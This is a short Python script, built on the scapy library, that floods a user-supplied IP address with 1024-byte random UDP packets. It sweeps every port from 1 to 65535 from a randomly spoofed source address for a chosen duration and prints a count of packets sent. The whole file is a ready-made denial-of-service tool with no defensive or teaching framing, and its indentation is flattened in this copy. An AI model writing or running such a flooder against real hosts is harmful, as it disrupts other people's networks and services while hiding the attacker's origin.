import sys
import os
import time
from scapy.all import *

os.system("clear")
destination_ip = input("\nEnter destination IP: ")
duration = int(input("\nEnter duration: "))
bytes = os.urandom(1024)
sent = 0
timeout = time.time() + duration

# Generate a random spoofed IP address once
spoofed_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))

while True:
try:
if time.time() > timeout:
sys.exit()
else:
for dest_port in range(1, 65536):
packet = IP(src=spoofed_ip, dst=destination_ip) / UDP(sport=dest_port, dport=dest_port) / bytes
send(packet, verbose=False)
sent += 1
print(sent, spoofed_ip, destination_ip, dest_port)
except KeyboardInterrupt:
sys.exit()